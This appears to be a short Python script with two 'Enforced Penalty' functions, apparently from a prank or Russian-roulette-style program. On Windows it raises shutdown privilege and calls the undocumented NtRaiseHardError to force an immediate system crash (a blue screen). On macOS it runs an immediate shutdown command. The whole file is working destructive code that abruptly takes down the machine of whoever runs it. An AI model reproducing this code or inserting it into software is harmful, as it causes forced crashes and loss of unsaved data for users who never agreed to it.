import ctypes
import os

def win_enforcer():
    "Enforced Penalty"
    ntdll = ctypes.windll.ntdll
    bool = ctypes.c_bool()
    u_long = ctypes.c_ulong()

    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(bool))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(u_long)):
        print("You're Dead!")
    else: 
        print("Bullet Failed...")
    return

def darwin_enforcer():
    "Enforced Penalty"
    os.system("shutdown -h now")
    return